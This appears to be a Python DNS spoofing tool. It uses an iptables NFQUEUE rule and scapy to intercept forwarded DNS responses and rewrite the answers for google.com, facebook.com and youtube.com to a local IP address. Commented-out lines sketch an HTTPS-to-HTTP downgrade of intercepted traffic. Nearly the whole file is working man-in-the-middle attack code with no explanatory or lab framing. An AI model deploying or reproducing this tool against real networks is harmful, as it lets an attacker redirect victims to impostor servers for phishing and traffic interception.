import os
import logging as log
import re
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR, TCP, Raw
from scapy.layers.http import *
from netfilterqueue import NetfilterQueue


class DnsSpoof:
	def __init__(self, hostDict, queueNum):
		self.hostDict = hostDict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()

	def __call__(self):
		log.info("Spoofing....")
		os.system(
			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		
		self.queue.bind(self.queueNum, self.callBack)
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(
				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
			log.info("[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if DNSRR in scapyPacket:
			try:
				log.info(f'[original] { scapyPacket[DNSRR].summary()}')
				queryName = scapyPacket[DNSQR].qname
				log.info(f'Query name: {queryName}')
				nameCheck = [key for key, val in self.hostDict.items() if re.search(key, queryName)]		
				if len(nameCheck) != 0:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata=self.hostDict[nameCheck[0]])
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
				else:
					log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')					
			except IndexError as error:
				log.error(error)
			packet.set_payload(bytes(scapyPacket))
			
		scapyPacket = IP(packet.get_payload())
		if TCP in scapyPacket and Raw in scapyPacket:
            # Check if it's an HTTPS request
			if scapyPacket[TCP].dport == 443:
				try:
					print(scapyPacket[IP].src + ", " + scapyPacket[IP].dst)
					# load = scapyPacket[Raw].load.decode()
					# # Check if it contains an HTTPS URL
					# if "GET " in load or "POST " in load:
					# 	# Replace HTTPS with HTTP
					# 	load = load.replace("https://", "http://")
					# 	scapyPacket[Raw].load = load.encode()

                    # Change the destination port to 80 (HTTP)
					# scapyPacket[TCP].dport = 80

                    # Remove checksums to force recalculation
					# del scapyPacket[IP].chksum
					# del scapyPacket[TCP].chksum
					# packet.set_payload(bytes(scapyPacket))
				except Exception as e:
					print(f"Error modifying packet: {e}")
		return packet.accept()	


if __name__ == '__main__':
	try:
		hostDict = {
			b"google.com.": "10.0.123.7",
			b"facebook.com.": "10.0.123.7",
			b"youtube.com": "10.0.123.7"
		}
		queueNum = 1
		log.basicConfig(format='%(asctime)s - %(message)s', 
						level = log.INFO)
		spoof = DnsSpoof(hostDict, queueNum)
		spoof()
	except OSError as error:
		log.error(error)
